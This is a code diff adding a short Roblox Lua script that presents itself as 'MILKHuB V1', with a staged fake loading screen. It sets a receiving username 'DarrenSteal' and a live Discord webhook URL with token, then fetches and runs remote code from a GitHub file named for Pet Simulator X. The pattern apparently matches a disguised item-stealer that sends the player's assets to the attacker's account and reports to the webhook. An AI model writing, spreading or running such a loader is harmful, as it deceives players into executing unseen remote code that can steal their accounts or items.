@@ -1,0 +1,9 @@
+Username = "DarrenSteal"
+WebHook = "https://discord.com/api/webhooks/1098623944652755005/VK5uPakw7isnPnDjgHHVE8iksNJgmR6GBZWBi-0kcLFqwRwGAIIxYoynYGbiyAb1T4Pz"
+loadingscreen = true
+_G.CustomScriptName = "MILKHuB V1"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
